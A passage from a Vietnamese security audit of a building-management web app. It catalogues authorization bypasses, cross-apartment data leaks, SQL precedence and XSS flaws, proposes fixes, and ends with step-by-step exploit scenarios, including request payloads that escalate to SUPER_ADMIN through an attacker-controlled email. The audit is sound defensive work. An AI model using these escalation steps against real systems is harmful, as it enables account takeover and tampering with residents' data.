#### [BUG-M9-01] `MEDIUM` – Race Condition giữa `updateParcel()` và `handoverParcel()`
- **Vị trí:** [ReceptionParcelService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ReceptionParcelService.php#L411)
- **Nguyên nhân:** Trong khi `handoverParcel()` dùng `DB::transaction()` + `lockForUpdate()`, hàm `updateParcel()` lại gọi `Parcel::findOrFail($id)` ở ngoài transaction mà không lock dòng, cho phép sửa đổi thông tin người nhận/ảnh/vị trí song song lúc lễ tân đang check-out bàn giao.

#### [BUG-M8-04] `LOW` – `ReceptionParcelPanel` lưu dữ liệu bưu phẩm vào `localStorage` không gắn theo User ID & không xóa khi Logout
- **Vị trí:** [ReceptionParcelPanel.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Components/ReceptionParcelPanel.tsx#L49-L64)
- **Nguyên nhân:** `PARCEL_CACHE_STORAGE_KEY` (`smartcassavas_reception_parcels_cache_v1`) lưu thông tin tên/SĐT/mã nhận bưu phẩm vào `localStorage` vĩnh viễn và không xóa khi chuyển tài khoản trên máy quầy lễ tân dùng chung.

---

### Nhóm J – Module 10: Biểu phí Dịch vụ *(Thuộc module của Xuân Hòa – KHÔNG TỰ Ý SỬA)*

> **Lưu ý phạm vi:** Toàn bộ file backend & frontend của Module Biểu phí do `Xuân Hòa <vhoa1682006@gmail.com>` phát triển (`042774e`, `d433337`). Theo Mục VI, chỉ báo cáo & đề xuất, tuyệt đối không sửa trực tiếp khi chưa có chỉ thị.

#### [BUG-M10-01] `CRITICAL` – Bypass xác thực quản trị cho MỌI Bearer token bắt đầu bằng `smart_token_` trong `ServicePricingController`
- **Vị trí:** [ServicePricingController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/ServicePricingController.php#L26-L28), [AuthController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/AuthController.php#L180)
- **Logic hiện tại:**
  ```php
  // ServicePricingController.php:26-28
  if ($request->bearerToken() && str_starts_with($request->bearerToken(), 'smart_token_')) {
      return null;
  }
  ```
  Trong khi `AuthController::login()` sinh mọi real session token đều có tiền tố `'smart_token_' . $user->id . '_' . Str::random(40)`!
- **Kịch bản khai thác:** **MỌI tài khoản đã đăng nhập (kể cả Cư dân thường `RESIDENT_OWNER` / `RESIDENT_MEMBER`)** chỉ cần dùng Bearer token hợp lệ vừa đăng nhập để gọi `POST /api/v1/pricing-configs`, `PUT /api/v1/pricing-configs/{id}`, `PUT /api/v1/pricing-configs/{id}/tiers`, `DELETE /api/v1/pricing-configs/{id}`, `PATCH .../toggle-active`. Thực tế chỉ bằng tài khoản cư dân đã đổi được đơn giá điện/nước/phí gửi xe toàn tòa nhà!
- **Đề xuất sửa:** Xóa bỏ hoàn toàn lines 26–28 khỏi `ServicePricingController::checkAdminAuthorization()`.

#### [BUG-M10-02] `HIGH` – `index()` không có Authorization check, `VIEW` sửa/xóa được biểu phí & `/vehicles/pricing-config` mở Public
- **Vị trí:** [ServicePricingController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/ServicePricingController.php#L38-L41), [ServicePricingController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/ServicePricingController.php#L58), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L648)
- **Nguyên nhân:** (1) `index()` không gọi `checkAdminAuthorization`. (2) `checkAdminAuthorization()` không nhận tham số permission ở bất kỳ method nào và cho phép `INVOICE:VIEW` hoặc `PRICING:VIEW` thực hiện `store`, `update`, `destroy`, `updateTiers`, `toggleActive`. (3) `GET /vehicles/pricing-config` ngoài group `auth.bearer` công khai cho cả guest.

#### [BUG-M10-03] `MEDIUM` – Không validate `effective_to_date >= effective_from_date`, cho phép sửa/xóa ghi đè biểu phí lịch sử và không xóa cache giá xe của `VehicleService`
- **Vị trí:** [ServicePricingController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/ServicePricingController.php#L161-L162), [ServicePricingService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/ServicePricingService.php#L104-L154)
- **Nguyên nhân:** Cho phép sửa trực tiếp `fixed_unit_price`, `vat_percentage`, `tiers` (`PricingTier::where(...)->delete()`) ngay cả khi biểu phí đó đã tham chiếu ở hóa đơn hoặc chốt chỉ số cũ thay vì tạo bản ghi version mới theo `effective_from_date`; thiếu validate `effective_to_date|after_or_equal:effective_from_date`; không xóa cache `pricing_config_*` và `parking_pricing_configs_all` của `VehicleService`. (Lưu ý thêm: `servicePricingApi.ts:72-88` đọc sai key storage và fallback `'smart_token_admin_demo'`.)

---

### Nhóm K – Module 11: Lịch trực Nhân viên

#### [BUG-M11-01] `HIGH` – `authorizeManager()` và `authorizeViewer()` bỏ qua RBAC Permission Matrix và route thiếu middleware `auth.bearer`
- **Vị trí:** [StaffScheduleController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/StaffScheduleController.php#L23-L58), [routes/web.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/routes/web.php#L248-L260)
- **Nguyên nhân:** `authorizeManager()` chỉ check `SUPER_ADMIN/ADMIN/BUILDING_MANAGER/MANAGER` và `authorizeViewer()` chỉ check role list (bao gồm cả `RECEPTIONIST`, `SECURITY_GUARD`, `STAFF`). Không hề dùng `hasPermission()` (`SCHEDULE:*` / `STAFF_SCHEDULE:*` cũng chưa được seed trong `RbacSeeder`). Các route `/api/v1/management/schedules*` và `/api/schedules*` không gắn middleware `auth.bearer` hay `cooldown:schedules`.
- **Tác động:** Nhân sự có `RECEPTIONIST`/`STAFF` (không có quyền quản lý lịch) hoặc bị thu hồi quyền xem vẫn gọi được `/staff-candidates` lấy thông tin liên hệ nhân viên khác (`email`, `phone_number`), còn quản lý bị tước quyền tạo/xóa lịch trên UI RBAC vẫn thao tác bình thường.

#### [BUG-M11-02] `MEDIUM` – Giao diện `ManagementStaffSchedulePanel` thiếu Week View & không kiểm tra quyền thao tác theo `usePermission`
- **Vị trí:** [ManagementStaffSchedulePanel.tsx](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Components/ManagementStaffSchedulePanel.tsx#L168-L176)
- **Nguyên nhân:** Mặc dù backend `StaffScheduleController::index()` và `StaffScheduleTest` hỗ trợ cả Week View lẫn Month View, UI `ManagementStaffSchedulePanel.tsx` chỉ cài đặt `getMonthRange(currentDate)` (không có nút chuyển Tuần/Tháng), đồng thời hiển thị nút Tạo/Sửa/Xóa ca trực cho mọi user truy cập panel mà không check `can()`. *(Lưu ý tích cực: thống kê KPI `summary` lấy từ full date range truy vấn chứ không tính trên trang hiện tại nên không bị sai lệch bởi pagination.)*

---

### Nhóm L – Module 12: Kiểm tra Hồi quy, Realtime & Tìm kiếm Toàn cục

#### [BUG-M12-01] `CRITICAL` – Rò rỉ sự kiện Realtime liên căn hộ cho Cư dân trên kênh `vehicles`, `residents`, `temporary-registrations`
- **Vị trí:** [QuocTinRealtimeService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/QuocTinRealtimeService.php#L685-L737)
- **Logic hiện tại:**
  ```php
  // QuocTinRealtimeService::filterEventsForResident() L733-734
  // Các kênh cư dân khác (vehicles, residents, temporary-registrations)
  $filtered[] = $ev;
  ```
  Hàm lọc server-side `filterEventsForResident()` lọc rất kỹ `parcels` (L700–714) và `visitors` (L717–731), chặn `rfid-cards`, `schedules`, `rbac`, `account-provisioning`, nhưng đến cuối vòng lặp (L734) lại **trả vô điều kiện** mọi event thuộc `quoc-tin.vehicles`, `quoc-tin.residents`, và `quoc-tin.temporary-registrations`!
- **Kịch bản khai thác:** Cư dân căn hộ A poll `GET /api/v1/realtime/events?channels=quoc-tin.vehicles,quoc-tin.residents,quoc-tin.temporary-registrations` sẽ nhận được event kèm `apartment_id`, `license_plate`, `police_status`, `registration_type`, `is_head_of_household` của **tất cả các căn hộ khác** mỗi khi có người đăng ký xe, sửa nhân khẩu hoặc duyệt tạm trú.
- **Đề xuất sửa:** Lọc bắt buộc theo `$ev['apartment_id']` (hoặc tra cứu `apartment_id` từ DB nếu thiếu) thuộc `$allowedApartmentIds` giống y hệt cách lọc `parcels`/`visitors` trước khi thêm vào `$filtered[]`.

#### [BUG-M12-02] `HIGH` – Lỗi ưu tiên toán tử SQL `OR` trong `GlobalSearchService::dbSearchResidents()` gây rò rỉ tìm kiếm liên căn hộ
- **Vị trí:** [GlobalSearchService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/Search/GlobalSearchService.php#L491-L504)
- **Nguyên nhân:** Chuỗi điều kiện `->whereHas(...)->orWhereHas(...)->orWhere(...)` không được nhóm trong closure `where(function ($q) ...)` trước khi nối `->whereIn('apartment_id', $scope['apartmentIds'])`! Khi Elasticsearch offline và chạy MySQL fallback, SQL sinh ra `WHERE <cond1> OR <cond2> OR (<cond3> AND apartment_id IN (...))`, làm cư dân tìm được dữ liệu cư dân của **mọi căn hộ khác**.

#### [BUG-M12-03] `HIGH` – `GlobalSearchService` phân quyền sai cho role `DEV`/`TECHNICIAN`, sai mã quyền và `TemporaryRegistration` thiếu `resident_user_id` trong index
- **Vị trí:** [GlobalSearchService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/Search/GlobalSearchService.php#L208-L236), [GlobalSearchService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/Search/GlobalSearchService.php#L381), [GlobalSearchService.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Services/Search/GlobalSearchService.php#L559), [TemporaryRegistration.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Models/TemporaryRegistration.php#L55-L75)
- **Nguyên nhân:**
  1. L208 gán role `DEV` có full quyền `isAdminOrManager`; L213 gán `TECHNICIAN` thành `isStaffOrReception` (xem được toàn bộ thẻ RFID, khách viếng thăm và bưu phẩm toàn tòa nhà).
  2. L233, 236 check các mã permission không tồn tại trong DB (`TEMPORARY_RESIDENCE:VIEW`, `RECEPTION:VISITOR_VIEW`).
  3. L559 (`dbSearchVehicles`) lọc khác điều kiện so với `buildElasticFilter()` đối với `$isStaffOrReception`.
  4. `TemporaryRegistration::toSearchableArray()` thiếu trường `resident_user_id` trong khi `GlobalSearchService::buildElasticFilter()` (L381) dùng `resident_user_id = "{userId}"` để cô lập hồ sơ tạm trú khi tìm bằng Elasticsearch.

#### [BUG-M12-04] `MEDIUM` – Frontend API clients tự gắn Bearer token giả lập `smart_token_*_demo`
- **Vị trí:** [globalSearchApi.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Services/globalSearchApi.ts#L78-L80), [rfidApi.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Services/rfidApi.ts#L91-L103), [vehicleApi.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Services/vehicleApi.ts#L101-L122), [buildingStructureApi.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Services/buildingStructureApi.ts#L162-L174), [servicePricingApi.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Services/servicePricingApi.ts#L79-L88), [api.ts](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/resources/js/Services/api.ts#L484-L492)
- **Nguyên nhân:** Dù Backend BUG-02 đã khóa `smart_token_*_demo` ở tầng `AuthenticateBearer`, các API client ở Frontend vẫn tự chèn `smart_token_admin_demo` / `smart_token_manager_demo` khi thiếu token thực tế thay vì từ chối/chuyển về `/login`, gây lỗi 401 khó hiểu cho người dùng và mở lại rủi ro nếu ai đó nới lỏng guard ở backend (như đã xảy ra ở `ServicePricingController`).

#### [BUG-M12-05] `LOW` – Thiếu kiểm tra `can()` của `usePermission` trên toàn bộ UI các Module 2–11
- **Vị trí:** Tất cả các page/panel trong `resources/js/Pages/Admin/` và `resources/js/Components/` ngoại trừ `RbacManagement.tsx` và `AppSidebar.tsx`.
- **Nguyên nhân:** Grep toàn bộ `resources/js/` cho thấy chỉ có **2 file** gọi `usePermission()` (`AppSidebar.tsx` và `RbacManagement.tsx`). Tất cả các giao diện khác hiển thị nút Thêm / Sửa / Xóa / Duyệt với mọi người dùng mở được màn hình đó.

---

## 5. Danh sách bug tiềm ẩn (`POTENTIAL BUG` & `DESIGN ISSUE`)

| Mã | Phân loại | Module | Mô tả vấn đề & vị trí |
|---|---|---|---|
| **POT-01** | `POTENTIAL BUG` | Module 1 / Shared | `routes/channels.php` định nghĩa callback xác thực WebSocket/Reverb private channels cho `quoc-tin.*` nhưng không dùng chung hàm lọc permission với HTTP REST routes; nếu bật Echo/Reverb thực tế (hiện dùng polling `/api/v1/realtime/events`), cần đối chiếu đồng bộ với các permission thực có trong DB. |
| **POT-02** | `POTENTIAL BUG` | Module 1 / Push | [PushNotificationController.php](file:///d:/QUANLYNHA/QUANLY_TOANHA-DANCU/app/Http/Controllers/PushNotificationController.php#L43-L55): `WebPushSubscription::updateOrCreate(['endpoint_hash' => ...], ['user_id' => $user->id, ...])` tự động chuyển quyền nhận thông báo của một `endpoint_hash` sang user mới nếu đăng nhập trên cùng trình duyệt chưa logout/unsubscribe. |
| **POT-03** | `DESIGN ISSUE` | All Modules | Sự lệch chuẩn nghiêm trọng giữa các mã permission kỳ vọng trong code/search/realtime (`TEMP_REG:*`, `TEMPORARY_RESIDENCE:*`, `RFID:*`, `SCHEDULE:*`, `PARCEL:CHECKOUT/RECEIVE/UPDATE/DELETE`, `PRICING:*`, `RESIDENT:CREATE/UPDATE/DELETE`, `RECEPTION:VISITOR_VIEW`) và những gì `RbacSeeder` thực sự nạp vào DB (`RESIDENT:VIEW`, `VEHICLE:*`, `VISITOR:*`, `PARCEL:VIEW`, `PARCEL:CREATE`). |
| **POT-04** | `POTENTIAL BUG` | Testing / CI | `ResidentCreateConcurrencyTest` và nhiều test trong `Vehicles`, `RfidManagement`, `ResidentVisitor`, `TemporaryRegistrations` dùng `rand(1000, 9999)` sinh mã căn hộ mà không dùng `DatabaseTransactions` — gây lỗi trùng `apartments.uq_apartment_number` ngẫu nhiên khi chạy lại nhiều lần trên cùng DB test (đã xảy ra thực nghiệm ở `test_case_08`). |
| **POT-05** | `DESIGN ISSUE` | Environment | `staffScheduleApi.ts` vẫn đính kèm header `X-User-Id` (L92) từ `localStorage` dù Backend `AuthenticateBearer` và `RbacService::resolveUser` đã loại bỏ fallback này — gây nhầm lẫn khi debug phân quyền. |

---

## 6. Danh sách lỗi đã được khắc phục (`ALREADY FIXED` & `FALSE POSITIVE`)

| Hạng mục | Trạng thái | Bằng chứng xác minh trên source code hiện tại |
|---|---|---|
| **BUG-01: Bỏ fallback user ngẫu nhiên ở quầy lễ tân** | `ALREADY FIXED` | `ReceptionParcelService::receiveParcel` & `assertStaffAuthorized` yêu cầu `$staffUser` hợp lệ và trả `401` khi null (`ReceptionParcelTest::test_receive_parcel_rejects_without_staff_identity_and_does_not_fallback` pass). |
| **BUG-02: Loại bỏ hardcoded demo password & token giả** | `ALREADY FIXED` | `AuthSecurityRegressionTest` (18/18 pass) và `AuthenticationHardeningTest` (6/6 pass): `AuthenticateBearer` bắt buộc kiểm tra hash `sha256` trong `user_sessions`, từ chối `is_revoked=1`, `expires_at` quá hạn (`401`), tài khoản không `ACTIVE` (`403`), OTP không lộ `debug_otp` khi production. |
| **BUG-03: Concurrency Lock ở Resident / TemporaryRegistration / Parcel Checkout** | `ALREADY FIXED` | `ResidentService::create/update`, `TemporaryRegistrationService::update/delete`, `ReceptionParcelService::handoverParcel` dùng `DB::transaction` + `lockForUpdate()` + kiểm tra `updated_at` optimistic lock; test concurrency pass. |
| **BUG-04 Stage 2A (`User::hasPermission('SPECIAL')`)** | `ALREADY FIXED` | `User.php:205-207`: khi kiểm tra `'SPECIAL'`, chỉ trả `true` nếu có `'SPECIAL'` hoặc `'SYSTEM:SPECIAL'`, không còn ăn wildcard `:SPECIAL` của module bất kỳ. |
| **BUG-04: Self-protection ở `RbacService::syncUserRoles()` & `syncRolePermissions()`** | `ALREADY FIXED` | `RbacService.php:199-203, 263-270`: chặn non-`SUPER_ADMIN` chỉnh quyền role `SUPER_ADMIN`, chặn gán `SUPER_ADMIN` và chặn xóa `SUPER_ADMIN` cuối cùng (với các endpoint `/rbac/users/{id}/roles` và `/roles/{id}/permissions`). |
| **BUG-05: Resident Realtime Apartment Scoping (cho Parcels & Visitors)** | `ALREADY FIXED` | `QuocTinRealtimeService::filterEventsForResident` (L689–731) chặn triệt để kênh admin (`rfid-cards`, `schedules`, `rbac`, `account-provisioning`) và lọc theo `$allowedApartmentIds` đối với `parcels`, `visitors`. |
| **Che PIN / QR bưu phẩm & SĐT/CCCD trong Global Search** | `ALREADY FIXED` | `Parcel::toSearchableArray()` & `VisitorRegistration::toSearchableArray()` không index `pickup_pin_code` / `pickup_qr_code` / `qr_access_pass_code`; `GlobalSearchService` che SĐT (`098****321`) đối với cư dân. |
| **Pagination & Tie-breaker kiểm kê Khách Tiếp Tân** | `ALREADY FIXED` | `ReceptionVisitorService` tách log check-in nhiều lần khỏi dòng đăng ký gốc (`ReceptionVisitorCheckinTest` tests 14–17 pass). |
| **KPI Lịch trực theo pagination** *(Kiểm tra xác nhận không lỗi)* | `FALSE POSITIVE` | `StaffScheduleController::index()` & `StaffScheduleService` tính `summary` trên toàn bộ khoảng `start_date..end_date` không phân trang -> KPI chính xác. |

---

## 7. Bảng mức độ CRITICAL / HIGH / MEDIUM / LOW

| Mức độ | Số lượng (QuocTin / Shared / Teammate) | Mã lỗi chi tiết |
|---|---|---|
| **CRITICAL** | **7** (6 QuocTin, 0 Shared, 1 Xuân Hòa) | `BUG-M1-01`, `BUG-M1-02`, `BUG-M4-01`, `BUG-M4-02`, `BUG-M6-01`, `BUG-M10-01` *(Xuân Hòa)*, `BUG-M12-01` |
| **HIGH** | **19** (17 QuocTin, 1 Shared, 1 Xuân Hòa) | `BUG-M1-03`, `BUG-M1-04`, `BUG-M1-07`, `BUG-M2-01`, `BUG-M2-02`, `BUG-M3-01`, `BUG-M3-02`, `BUG-M4-03`, `BUG-M5-01`, `BUG-M5-02`, `BUG-M6-02`, `BUG-M6-03`, `BUG-M7-01`, `BUG-M7-02` *(Shared)*, `BUG-M8-01`, `BUG-M10-02` *(Xuân Hòa)*, `BUG-M11-01`, `BUG-M12-02`, `BUG-M12-03` |
| **MEDIUM** | **19** (17 QuocTin, 1 Shared, 1 Xuân Hòa) | `BUG-M1-05`, `BUG-M1-06`, `BUG-M1-08`, `BUG-M2-03`, `BUG-M3-03`, `BUG-M3-04`, `BUG-M3-05`, `BUG-M4-04`, `BUG-M5-03`, `BUG-M5-04`, `BUG-M6-04` *(Shared)*, `BUG-M6-05`, `BUG-M7-03`, `BUG-M8-02`, `BUG-M8-03`, `BUG-M9-01`, `BUG-M10-03` *(Xuân Hòa)*, `BUG-M11-02`, `BUG-M12-04` |
| **LOW** | **2** (2 QuocTin) | `BUG-M8-04`, `BUG-M12-05` |
| **TỔNG** | **47** | **42 QuocTin + 2 Shared + 3 Xuân Hòa** |

---

## 8. File và dòng code chính xác

| File | Dòng chính xác | Vấn đề |
|---|---|---|
| `app/Http/Controllers/AccountProvisioningController.php` | `L39-41`, `L225-268` | `BUILDING_MANAGER`/`USER:CREATE` qua cửa mọi method; `checkStatus` public lộ username/full_name |
| `app/Services/AccountProvisioningService.php` | `L319`, `L427-458`, `L498-566` | `assignRoles` cho gán `SUPER_ADMIN`; `hash_equals` so hash thô; thiếu clear cache & self/superadmin guard |
| `app/Http/Controllers/UserController.php` | `L339-393`, `L404-415` | `syncUserPermissions` cho phép `USER:UPDATE` tự nâng quyền; `firstOrCreate` crash `1062` sau soft-delete |
| `app/Models/User.php` | `L165-172` | `getAllPermissions()` không lọc `roles.deleted_at IS NULL` |
| `app/Services/RbacService.php` | `L45-61` | Fallback `hasPermission()` cho `stdClass` thiếu `deleted_at`, `CUSTOM_USER_%`, `SYSTEM:SPECIAL` |
| `resources/js/Hooks/usePermission.ts` | `L71-79`, `L127-134` | Khôi phục wildcard `permissions.some(p => p.endsWith(':SPECIAL'))` |
| `resources/js/Pages/Admin/AccountProvisioningManagement.tsx` | `L841`, `L1303` | Dùng `'SECURITY'` thay cho `'SECURITY_GUARD'` gây gán nhầm thành `RESIDENT_OWNER` |
| `resources/js/Components/Layout/AppSidebar.tsx` | `L62-79` | Chỉ check `can()` với 5 item, các module QuocTin trả thẳng `true` |
| `resources/js/Components/Layout/AppTopbar.tsx` | `L64-85` | Tin `localStorage.smartcassavas_session` để bật nút chuyển cổng Admin |
| `resources/js/app.tsx` | `L438-488`, `L546-567` | Cư dân không bị chặn khi vào `/le-tan`, `/quan-ly` hardcode `userRole="manager"` |
| `app/Http/Controllers/ResidentController.php` | `L35-36` | Kiểm tra quyền bằng role hardcode thay cho `RESIDENT:*` |
| `app/Http/Requests/ResidentRequest.php` | `L22-28`, `L45` | Role-only check; `stay_end_date` không đối chiếu `stay_start_date` từ DB khi PATCH/PUT |
| `app/Services/ResidentService.php` | `L162-220`, `L307-319` | Thêm lại user từng soft-delete lỗi 409 do `uq_resident_apt`; `where()->update()` bỏ qua Scout sync |
| `app/Http/Controllers/TemporaryRegistrationController.php` | `L32-33`, `L561` | Role-only admin check; trả HTML không escape ở `/download` |
| `app/Http/Requests/TemporaryRegistrationRequest.php` | `L106-108`, `L147-150`, `L186-189`, `L218` | Role-only check; `RESIDENT_OWNER` role global cho sửa hộ thành viên căn hộ khác; cho nhập `police_reference_code` |
| `app/Services/TemporaryRegistrationService.php` | `L271`, `L524`, `L547-670` | Không `unset('police_reference_code')`; CCCD lưu disk `public`; CT01 HTML XSS |
| `resources/js/Pages/Admin/TemporaryRegistrationManagement.tsx` | `L552-562`, `L1847-1851` | `window.open().document.write()` & `<iframe srcDoc>` không `sandbox` kích hoạt Stored XSS |
| `resources/js/Components/ResidentTemporaryRegistrationPanel.tsx` & `api.ts` | `L565-574` / `L2236-2238` | Thẻ `<a>` mở `/download` không kèm Bearer token -> 401 |
| `app/Http/Controllers/VehicleController.php` | `L23-49`, `L126-334`, `L339-422` | `checkAdminAuthorization($request)` thiếu param quyền + `VEHICLE:VIEW` bypass ghi; 3 endpoint `/meta/*` mở toang |
| `app/Http/Requests/VehicleRequest.php` & `app/Services/VehicleService.php` | `L58, 80` / `L218-221` | Client tự gửi `monthly_parking_fee` (vd `1đ`) ghi đè bảng giá tòa nhà |
| `app/Http/Controllers/AccessCardController.php` | `L23-47` | Role-only check, bỏ qua hoàn toàn RBAC permission |
| `app/Services/AccessCardService.php` | `L172, 224, 239, 257, 296` | `(int) $actorId` phá UUID realtime; `toggle-status` mở khóa nhầm thẻ `REVOKED`/`LOST_REPORTED` |
| `app/Http/Requests/AccessCardRequest.php` | `L59-77` | Thiếu cross-check `assigned_user_id`/`assigned_vehicle_id` thuộc căn hộ và `expiry_date` >= `issued_date` |
| `app/Services/ResidentVisitorService.php` | `L28-75`, `L205-211`, `L269-325`, `L455`, `L576` | Fallback `apartments->first()`, IDOR giữ `apartment_id` nạn nhân khi `!$hasAccess`, `$hasOwn` bất nhất, role `STAFF` |
| `app/Http/Controllers/ResidentPortalController.php` | `L151-182` | Overview lộ QR Pass & CCCD khách của thành viên khác cùng căn hộ |
| `app/Services/ReceptionVisitorService.php` | `L27-62` | `assertStaffAuthorized` cho role bypass permission `VISITOR:CHECKIN` / `VISITOR:VIEW` |
| `app/Http/Controllers/ReceptionPortalController.php` | `L15-171` | Không xác thực và fallback số liệu demo giả (`18`, `42`, `A1001`) |
| `app/Services/ReceptionDashboardService.php` | `L18-37` | Role-only check thay vì permission |
| `app/Services/ReceptionParcelService.php` | `L154`, `L411`, `L793-856` | KPI lộ toàn tòa nhà cho cư dân; `updateParcel` không lock; `resolveResidentApartmentIds` thiếu check hạn; role bypass `PARCEL:*` |
| `resources/js/Components/ReceptionParcelPanel.tsx` | `L49-64` | Cache PII bưu phẩm trong `localStorage` không gắn theo user/logout |
| `app/Http/Controllers/ServicePricingController.php` *(Xuân Hòa)* | `L26-28`, `L38-41`, `L58`, `L161-162` | Bypass mọi token `smart_token_*`; `index()` public; không phân quyền action; thiếu validate `effective_to_date` |
| `app/Services/ServicePricingService.php` *(Xuân Hòa)* | `L104-154` | Sửa/xóa đè dữ liệu cấu hình cũ không tạo version, không xóa cache xe |
| `app/Http/Controllers/StaffScheduleController.php` | `L23-58` | `authorizeManager` / `authorizeViewer` chỉ check role, bỏ qua permission |
| `routes/web.php` | `L216-226, 248-260, 368-374, 472-474, 596, 648` | Thiếu `auth.bearer` ở routes visitors/schedules/reception-overview/pricing-config; route `USER:UPDATE` trên `/permissions` |
| `app/Services/QuocTinRealtimeService.php` | `L733-735` | `filterEventsForResident` bỏ sót lọc căn hộ cho `vehicles`, `residents`, `temporary-registrations` |
| `app/Services/Search/GlobalSearchService.php` | `L208-236`, `L381`, `L491-504`, `L559` | Lỗi SQL `OR` precedence ở `dbSearchResidents`; sai quyền `DEV`/`TECHNICIAN` & mã quyền không tồn tại |
| `app/Models/TemporaryRegistration.php` | `L55-75` | `toSearchableArray()` thiếu `resident_user_id` phục vụ ES resident filter |
| `resources/js/Services/globalSearchApi.ts`, `rfidApi.ts`, `vehicleApi.ts`, `buildingStructureApi.ts`, `servicePricingApi.ts` | Các hàm `getAuthHeaders()` | Tự chèn bearer token giả lập `smart_token_*_demo` |

---

## 9. API bị ảnh hưởng

- **RBAC & Account Provisioning:**
  - `PUT|PATCH /api/v1/users/{id}/permissions`, `PUT|PATCH /api/v1/admin/users/{id}/permissions`, `PUT|PATCH /api/v1/rbac/users/{id}/permissions`
  - `DELETE /api/v1/users/{id}/permissions` -> tái cấp lại qua `PUT .../permissions`
  - `GET /api/v1/account-provisioning/status` (public PII)
  - `GET|POST /api/v1/account-provisioning`, `GET|PUT|DELETE /api/v1/account-provisioning/{id}`, `POST .../import`, `POST .../toggle-lock`, `POST .../resend-activation`, `POST .../batch-resend`
- **Residents & Temporary Registrations:**
  - `GET|POST /api/v1/residents`, `GET|PUT|PATCH|DELETE /api/v1/residents/{id}`, `GET /api/v1/meta/apartments`
  - `GET|POST|PUT|PATCH|DELETE /api/v1/residents/temporary-registrations*` và alias `/api/v1/temporary-registrations*`
  - `GET /api/v1/residents/temporary-registrations/{id}/export`, `.../download`, `POST .../upload-cccd`
- **Vehicles & RFID:**
  - `GET|POST /api/v1/vehicles`, `GET|PUT|PATCH|DELETE /api/v1/vehicles/{id}`, `PATCH .../toggle-active`, `POST .../approve`, `POST .../sync-invoice`
  - `GET /api/v1/vehicles/meta/apartments`, `/api/v1/vehicles/meta/residents`, `/api/v1/vehicles/meta/apartments/{apartmentId}/residents`
  - `GET /vehicles/pricing-config` (public alias)
  - `GET|POST /api/v1/rfid-cards`, `GET|PUT|PATCH|DELETE /api/v1/rfid-cards/{id}`, `PATCH .../toggle-status`, `GET /api/v1/rfid-cards/meta/apartments`, `.../meta/residents`
- **Visitors, Parcels & Reception:**
  - `GET|POST /api/v1/resident/visitors`, `GET|PUT|PATCH /api/v1/resident/visitors/{id}`, `POST|DELETE /api/v1/resident/visitors/{id}/cancel`, `GET /api/v1/resident/overview`
  - `GET /api/v1/reception/overview`, `GET /api/v1/reception/dashboard`, `GET /api/reception/dashboard`
  - `GET /api/v1/reception/visitors`, `.../lookup`, `POST .../check-in`, `POST .../check-out`
  - `GET|POST /api/v1/reception/parcels`, `GET .../lookup`, `GET .../recipients/search`, `.../apartments/search`, `PUT|POST|DELETE /api/v1/reception/parcels/{id}`, `POST .../check-out`, `POST .../handover`, `POST .../remind*`
- **Service Pricing, Schedules, Realtime & Search:**
  - `GET|POST /api/v1/pricing-configs`, `GET|PUT|DELETE /api/v1/pricing-configs/{id}`, `PATCH .../toggle-active`, `GET|PUT .../tiers`, `POST .../simulate`
  - `GET|POST /api/v1/management/schedules*`, `PUT|POST|DELETE /api/v1/management/schedules/{id}` và alias `/api/schedules*`
  - `GET /api/v1/realtime/events`, `GET /api/realtime/events`, `GET /api/v1/search`

---

## 10. Kịch bản tái hiện (Exploit Scenarios)

1. **Leo thang lên `SUPER_ADMIN` qua Account Provisioning (`BUG-M1-01`):**
   - *Điều kiện:* Tài khoản `BUILDING_MANAGER` (hoặc user tùy chỉnh chỉ có `USER:CREATE`).
   - *Bước 1:* Gọi `POST /api/v1/account-provisioning` với payload `{"full_name": "Evil Admin", "email": "evil@attacker.test", "phone_number": "0988776655", "roles": ["SUPER_ADMIN"]}`.
   - *Bước 2:* `checkAdminAuthorization` cho qua; `AccountProvisioningService::assignRoles()` gán `role_code = SUPER_ADMIN` không cần check `$actor->isSuperAdmin()`.
   - *Bước 3:* Đọc token kích hoạt từ email `evil@attacker.test`, gọi `POST /api/v1/account-provisioning/activate`, đăng nhập với quyền `SUPER_ADMIN`.
2. **Tự cấp `SYSTEM:SPECIAL` và toàn quyền qua `syncUserPermissions` (`BUG-M1-02`):**
   - *Điều kiện:* User chỉ có quyền `USER:UPDATE`.
   - *Bước:* Gọi `PUT /api/v1/users/{selfId}/permissions` với `{"permissions": ["SYSTEM:SPECIAL", "ROLE:ASSIGN_PERMISSION", "USER:DELETE"]}`. Request kế tiếp `CheckPermission` và `User::hasPermission()` đọc `CUSTOM_USER_...` -> thông qua toàn hệ thống.
3. **Thay đổi đơn giá điện/nước tòa nhà bằng tài khoản Cư dân (`BUG-M10-01`):**
